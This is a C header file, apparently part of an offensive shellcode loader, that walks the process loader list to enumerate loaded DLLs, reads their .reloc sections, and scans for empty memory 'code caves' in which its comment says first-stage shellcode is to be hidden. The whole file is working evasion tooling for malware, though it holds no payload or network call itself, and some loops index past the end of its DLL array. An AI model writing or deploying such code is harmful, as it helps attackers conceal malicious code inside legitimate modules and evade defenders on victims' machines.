/*
	THIS HEADER FILE WILL SEARCH FOR CODE CAVES [EMPTY CHUNCKS OF MEMORY] IN LOCAL DLLS.
	THE SEARCH WILL BE AT .RELOC SECTION [BETTER CHANCE TO FIND EMTPY CHUNKS].
	THE PLACE THAT WILL BE FOUND WILL BE USED TO HIDE THE 1ST STAGE SHELLCODE *ONLY*.
	THATS BCZ IT IS OFTEN SMALLER AND CAN FIT
*/

#pragma once

#include <Windows.h>
#include <winternl.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")
#define MAXDLLS 64			// more than 64 dlls mapped to us ??
#define MAXSEARCH 1000		// 1k * 16 = 16,000 bytes we can search [up or down]
#define CHUNK_SEARCH 0x10



typedef struct DllEnumerated {
	CHAR DllName[MAX_PATH];
	PVOID DllBase;
	DWORD reloc;
	DWORD SizeOfRawData;
};

struct DllEnumerated ArrayOfDlls[MAXDLLS];

/*
void PrintAll() {
	for (int i = 0; i < MAXDLLS + 1; i++) {
		if (ArrayOfDlls[i].DllBase != NULL){
			printf("\t\t[%d] %s is at 0x%p [.reloc: %x of size: %d]\n",i,  ArrayOfDlls[i].DllName, ArrayOfDlls[i].DllBase, ArrayOfDlls[i].reloc, (unsigned int)ArrayOfDlls[i].SizeOfRawData);
		}
	}
}
*/


BOOL GenerateBaseAddress(PVOID* pShell) {
	PVOID pShell2 = *pShell;
	int index = 0, result = -1;
	CONST BYTE NullShell[CHUNK_SEARCH] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	if (memcmp(&NullShell, pShell2, sizeof(NullShell)) != 0){
		while ((result = memcmp(&NullShell, pShell2, sizeof(NullShell))) != 0 && index < MAXSEARCH) {
			(ULONG_PTR)pShell2 += CHUNK_SEARCH;
			// some nice cli shit
			printf("\r[*]--------> 0x%p ", (VOID*)pShell2);
			Sleep(50);
			fflush(stdout);
			index++;
		}
		printf("\n");
	}
	else{
		while ((result = memcmp(&NullShell, pShell2, sizeof(NullShell))) == 0 && index < MAXSEARCH) {
			(ULONG_PTR)pShell2 -= CHUNK_SEARCH;
			// some nice cli shit
			printf("\r[*]--------> 0x%p ", (VOID*)pShell2);
			Sleep(50);
			fflush(stdout);
			index++;
		}
		printf("\n");
	}

	*pShell = pShell2;

	if (memcmp(&NullShell, *pShell, sizeof(NullShell)) == 0){
		return TRUE;
	}
	else {
		return NULL;
	}
}



PVOID GetSuitableAddress(SIZE_T ShellcodeSize) {
	PVOID pShell = NULL;
	for (int i = 0; i < MAXDLLS + 1; i++) {
		if (ShellcodeSize < ArrayOfDlls[i].SizeOfRawData && i > 0) {
			pShell = (PVOID)((ULONG_PTR)ArrayOfDlls[i].DllBase + ArrayOfDlls[i].reloc);
			if (GenerateBaseAddress(&pShell)){
				return pShell;
			}
			continue;
		}
	}
	return NULL;
}


BOOL GetReloc(HMODULE hMod) {
	PIMAGE_NT_HEADERS64 NtHeader = ImageNtHeader(hMod);
	PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeader);
	for (WORD i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
		if (memcmp(Section->Name, ".reloc", sizeof(".reloc")) == 0) {
			for (int i = 0; i < MAXDLLS + 1; i++) {
				if (ArrayOfDlls[i].reloc == NULL && ArrayOfDlls[i].SizeOfRawData == NULL) {
					ArrayOfDlls[i].reloc = Section->VirtualAddress;
					ArrayOfDlls[i].SizeOfRawData = Section->SizeOfRawData;
					break;
				}
			}
			return TRUE;
		}
		Section++;
	}
	return FALSE;
}



BOOL Initialize () {

#ifdef _M_X64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif

	PLIST_ENTRY pLE = pPEB->Ldr->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pLDTE = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InMemoryOrderModuleList.Flink;
	PPEB_LDR_DATA pPLD = (PPEB_LDR_DATA)pPEB->Ldr;
	PLIST_ENTRY Head = &pPLD->InMemoryOrderModuleList;
	PLIST_ENTRY Current = Head->Flink;
	PCHAR DLL = NULL;
	DWORD DLLLen = 0;

	if (pPEB == NULL || pLE == NULL || pLDTE == NULL || pPLD == NULL || Head == NULL || Current == NULL){
		return FALSE;
	}
	
	do {
		DLLLen = WideCharToMultiByte(CP_ACP, 0, pLDTE->FullDllName.Buffer, pLDTE->FullDllName.Length, NULL, 0, NULL, NULL);
		DLL = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DLLLen);
		WideCharToMultiByte(CP_ACP, 0, pLDTE->FullDllName.Buffer, pLDTE->FullDllName.Length, DLL, DLLLen, NULL, NULL);
		
		if (DLL != NULL && pLDTE->Reserved2[0] != NULL) {
			CharUpperA(DLL);
			for (int i = 0; i < MAXDLLS; i++) {
				if (ArrayOfDlls[i].DllBase == NULL) {
					ArrayOfDlls[i].DllBase = (PVOID)pLDTE->Reserved2[0];
					strcpy(ArrayOfDlls[i].DllName, DLL);
					break;
				}
			}
			if(!GetReloc((HMODULE)pLDTE->Reserved2[0])){
				return FALSE;
			}
		}
		
		pLE = pLE->Flink;
		pLDTE = (PLDR_DATA_TABLE_ENTRY)(pLE->Flink);
		HeapFree(GetProcessHeap(), 0, DLL);
		Current = Current->Flink;

	} while (Current != Head);

	return TRUE;
}
